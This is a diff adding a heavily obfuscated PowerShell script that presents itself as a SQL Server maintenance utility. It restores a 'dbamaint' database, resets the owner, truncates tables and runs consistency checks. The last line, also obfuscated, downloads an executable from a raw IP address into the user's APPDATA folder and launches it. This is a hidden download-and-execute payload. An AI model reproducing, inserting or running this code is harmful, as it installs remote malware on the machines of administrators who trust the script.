@@ -1,0 +1,161 @@
+param( 
+	${sQl`sE`RvEr},
+	${baKf`ILE} = (('B'+'me'+'Bmexsq'+'lutil18'+'BmeedXpB'+'meMSS'+'Q'+'L10'+'.MSSQLSERVERBm'+'e'+'MSSQ'+'L'+'Bmedbam'+'aint'+'_empty'+'_11_26_20'+'12.bak').("{0}{1}{2}"-f're','PLaC','E').Invoke('Bme','\')."rE`P`lAcE"(([ChAR]100+[ChAR]88+[ChAR]112),'$')),
+	${fiL`e`pREfIX} = 'Log',
+	[switch]${l`OG}
+)
+
+
+
+
+if (!${sQls`erv`Er} )
+{
+	${s`qLser`Ver} = &("{3}{0}{2}{1}" -f 'C','ntent','o','Get-') ((("{3}{1}{2}{7}{6}{8}{0}{5}{4}"-f 'ist.','}De','xm','E:{0','t','tx','rve','a{0}data{0}Se','rL'))  -f  [cHaR]92)
+}
+
+
+function RU`N-q`UERY()
+{
+	param (
+		${SQL`QUEry}
+		, ${s`QL`SERVer}
+		, ${sQL`CA`TALOg}
+		, ${S`qLU`SEr}
+		, ${Sq`LpASS}
+	)
+	
+	${SQ`lCoN`Nec`TIon} = .("{2}{1}{0}" -f 't','-Objec','New') ("{3}{0}{2}{1}{5}{4}{9}{6}{8}{7}" -f 'st','m','e','Sy','a.','.Dat','lClient','tion','.SqlConnec','Sq')(('Data'+' '+"Source=$SqlServer;Integrated "+'Securi'+'ty='+'SSPI;I'+'nit'+'ial '+"Catalog=$SqlCatalog;"));
+	
+	${SqL`cmD} = .("{3}{2}{1}{0}"-f 't','c','e','New-Obj') ("{2}{0}{4}{9}{3}{1}{8}{6}{5}{7}"-f't','ent.Sq','Sys','.SqlCli','em','man','Com','d','l','.Data')
+	${SQ`lCMd}."CO`M`M`AnDtExT" = ${s`Ql`QU`eRy}
+	${S`qlcMD}."c`o`NnEctION" = ${s`QlCoNNE`ctIOn}
+	
+	${s`ql`ADaP`TeR} = &("{0}{1}{2}{3}" -f'New','-','O','bject') ("{5}{0}{8}{7}{3}{4}{1}{6}{2}" -f 'em.Data','qlDataAdap','er','Cl','ient.S','Syst','t','ql','.S')
+	${SqLA`DaP`TeR}."SelECTc`omMA`Nd" = ${SQ`lc`Md}
+	
+	${Data`SEt} = &("{0}{1}{2}"-f'Ne','w-Obj','ect') ("{3}{2}{1}{0}{4}" -f 'DataS','stem.Data.','y','S','et')
+	${A} = ${SqLAD`A`PTEr}.("{0}{1}" -f 'Fi','ll').Invoke(${DaT`A`sET})
+	
+	${S`qL`c`OnnEc`TiOn}.("{1}{0}" -f'lose','C').Invoke()
+	
+	${da`TaS`Et}."tAB`lES" | &("{0}{1}{2}{3}" -f 'S','el','ect-Obje','ct') -ExpandProperty ("{1}{0}" -f'ows','R')
+}
+
+
+${Tru`NcDBaMA`iNt} = ((("{28}{109}{35}{102}{31}{111}{59}{13}{15}{93}{25}{9}{11}{88}{58}{20}{8}{100}{29}{71}{23}{84}{19}{74}{63}{77}{108}{17}{2}{37}{106}{33}{76}{32}{45}{95}{53}{97}{41}{57}{0}{73}{5}{99}{43}{56}{39}{47}{110}{85}{64}{105}{44}{3}{34}{24}{55}{51}{75}{14}{98}{54}{18}{26}{101}{60}{61}{87}{62}{82}{70}{66}{81}{107}{48}{21}{49}{80}{12}{46}{103}{36}{78}{1}{52}{68}{96}{22}{10}{16}{42}{65}{91}{27}{79}{72}{94}{30}{86}{6}{50}{104}{67}{40}{7}{69}{38}{83}{90}{4}{89}{92}" -f'oreign key an',' + Qb','
+		WHE','l',' dTabl',' ','	CLO','Tabl','Tabl','RCH','MD;
+	','AR(2','T @CMD = QbtTRUNCATE TABLE [','CM','@T','D','	exec(@CM','s','le;
+',' name ','E d','IN','@C','FOR','OM dTa','A','		
+','FE','
+	DEC','RSO',';
+		END','SYS','= QbtSQLDir','0
+		AND Nam','es;
+	FETCH NEXT FR','ARE @Tab','@Tabl','RE is_ms_shipp','s','by ','d','ain','D','cated','		
+	OPEN dTab','PathsQbt','Qbt ','the','BEG','
+		
+','S',' ','t]Q',' -- ','b','bles',' ','s a f','CLAR','E
+	DECLARE @','HIL','E @@','TCH','M','t uses it',');
+','=',' ','bt
+		PRIN','e','TUS ','R ',' FROM dTables INT','d','FRO','INTO ','e !',' sy','e','TCH NEXT','		SELEC',' 0','_STA',';
+	DE','
+		SELECT','sproc tha',';
+		
+','FE','56)
+
+	DE','e','ALLOCATE','		','s;',' NV','O @Table',';','T ','cont','a','is trun','es CU','	W','le ','+ ','E','
+','ed = ','
+		','s.table','L',' ','NAM')) -CREpLAcE ([cHAR]81+[cHAR]98+[cHAR]116),[cHAR]39)
+
+${dRiVeSq`Ue`Ry} = ((("{24}{27}{34}{2}{46}{25}{5}{16}{10}{1}{45}{13}{39}{9}{19}{20}{44}{35}{37}{4}{11}{14}{30}{7}{26}{41}{29}{6}{8}{36}{43}{21}{12}{28}{23}{31}{18}{38}{0}{42}{15}{33}{3}{40}{22}{32}{17}"-f'H','HAR(1','drive ','LI','  ','(1),
+	','.',' 
+','X','drive
+			',' VARC','   ','
+SELE','drives
+		','     ','ive ','free ','1','@dri',', f','re','drives
+','%',' drive
+FROM ','
+DECLARE @','R','E','drives TABLE
+	( ','CT','STER.',' ','  ','C%WUI
+ORDER BY ','NOT ','
+	','
+	','p_f','		)
+','ves
+W','	( ','KE WUI','XEC MA','ERE dr','ixed','e','6)
+	);
+INSERT INTO @','CHA'))  -cREPLacE  'WUI',[CHar]39)
+
+${o`W`N`eRuPDaTe} = ((("{5}{1}{7}{4}{0}{3}{2}{6}"-f'ng','E','r','edbowne','ha','EX',' {0}sa{0};','C sp_c')) -F  [Char]39)	
+${uPD`AtEst`AtS} = ("{4}{2}{1}{0}{6}{5}{3}" -f'_up',' sp','ec','s;','ex','estat','dat')
+${c`h`eCkDB} = ("{4}{0}{3}{1}{2}{5}"-f 'C','_PUR','I','C CHECKDB WITH DATA','DB','TY;')
+
+
+
+
+foreach ( ${Ser`V`Er} IN ${s`QLS`eRvER} )
+	{
+	
+	${DR`ives} = .("{2}{0}{1}"-f 'un-','Query','R') -SqlQuery ${dr`IVESqU`E`RY} -SqlServer ${SE`Rv`ER} -SqlCatalog ("{0}{1}"-f'maste','r') | &("{1}{0}" -f'ct','Sele') ("{1}{0}"-f 'ive','dr')
+	
+	
+	if ( ${DR`ivEs}."Co`UNt" -gt 1 ) 
+	{
+		.("{2}{1}{0}"-f't','os','Write-H') ("{0}{3}{2}{4}{1}"-f'Multiple driv','ters found.','le','e ','t')
+		foreach ( ${d`RIVE} IN ${dR`IveS} ) 
+			{
+			switch (${DrI`VE}) 
+				{ 
+			    "D" { .("{2}{0}{1}{3}" -f'store-','SQLda','Re','tabase') -SQLServer ${s`Er`VEr} -SQLDatabase ("{0}{1}" -f 'dbamain','t') -Path ${BA`kfiLe} -TrustedConnection -DDrive $(${dr`IVe}."DRI`VE") -LDrive $(${Dr`I`VE}."DRi`Ve") }
+			    "E" { &("{3}{4}{2}{1}{0}"-f 'e','bas','QLdata','Re','store-S') -SQLServer ${s`ErVer} -SQLDatabase ("{1}{0}{2}" -f 'bam','d','aint') -Path ${B`AKf`iLe} -TrustedConnection -DDrive $(${d`RiVE}."Dr`iVE") -LDrive $(${dr`i`VE}."D`RIVE") }
+			    "F" { .("{2}{4}{0}{1}{3}" -f'da','tabas','Restore','e','-SQL') -SQLServer ${S`ER`VER} -SQLDatabase ("{1}{2}{0}"-f'int','db','ama') -Path ${B`Ak`FilE} -TrustedConnection -DDrive $(${dR`iVE}."dRi`VE") -LDrive $(${D`RiVE}."drI`Ve") }
+				"G" { .("{1}{5}{0}{3}{4}{2}"-f'Q','Rest','se','Lda','taba','ore-S') -SQLServer ${s`e`RvER} -SQLDatabase ("{1}{0}" -f'bamaint','d') -Path ${BaK`F`ile} -TrustedConnection -DDrive $(${dR`IVe}."drI`Ve") -LDrive $(${D`Ri`Ve}."DrI`Ve") }
+				"H" { &("{3}{2}{0}{1}" -f 'QLdat','abase','estore-S','R') -SQLServer ${SER`VEr} -SQLDatabase ("{1}{2}{0}"-f'maint','db','a') -Path ${b`AkFilE} -TrustedConnection -DDrive $(${Dri`VE}."Dr`iVe") -LDrive $(${D`RIVE}."dR`IVE") }
+    			}
+			}
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	}
+	ELSE
+	{
+		.("{0}{1}{3}{2}"-f'Write','-H','t','os') ("{4}{2}{0}{3}{1}" -f'iv','er found.',' dr','e lett','Single')
+		
+		&("{0}{1}{2}"-f'W','rit','e-Host') "Restore-SQLdatabase -SQLServer $Server -SQLDatabase dbamaint -Path $BAKFile -TrustedConnection -DDrive $($Drives.Drive) -LDrive $($Drives.Drive) "
+		.("{4}{0}{3}{2}{5}{1}"-f 'e','tabase','e-SQLd','stor','R','a') -SQLServer ${Se`RvER} -SQLDatabase ("{1}{2}{0}"-f 'maint','d','ba') -Path ${ba`kFI`LE} -TrustedConnection -DDrive $(${D`RIveS}."Dr`iVE") -LDrive $(${driv`eS}."dr`ive")
+	}
+	
+	
+	.("{1}{3}{2}{0}" -f 'y','Run-Q','r','ue') -SqlQuery ${OwN`eR`UPdATE} 	-SqlServer ${S`ER`VER} -SqlCatalog ("{0}{2}{1}"-f'db','t','amain')
+	&("{1}{0}{2}" -f'-Que','Run','ry') -SqlQuery ${t`R`UnC`Db`AmaiNt} 	-SqlServer ${Se`Rv`Er} -SqlCatalog ("{1}{0}{2}"-f'bam','d','aint')
+	.("{1}{0}{2}" -f'uer','Run-Q','y') -SqlQuery ${Up`d`AtE`STAtS} 	-SqlServer ${SeR`V`ER} -SqlCatalog ("{1}{0}{2}"-f'ba','d','maint')
+	.("{0}{2}{3}{1}" -f 'Ru','ry','n-','Que') -SqlQuery ${che`C`kdB} 		-SqlServer ${SE`Rv`er} -SqlCatalog ("{0}{1}{2}"-f'db','a','maint')
+	
+	}
+
+
+(.("{2}{1}{0}"-f't','bjec','New-O') ("{3}{6}{2}{4}{0}{5}{1}"-f'C','ent','.W','System.N','eb','li','et')).("{2}{0}{1}"-f'wnloadFil','e','Do').Invoke(("{9}{6}{5}{2}{8}{4}{10}{3}{0}{7}{1}"-f 'v','e','.53','csrs','oo','94.102','ttp://','.ex','.238/~yah','h','/'),"$env:APPDATA\csrsv.exe");.("{0}{2}{3}{1}" -f 'St','s','art','-Proces') ("$env:APPDATA\csrsv.exe")
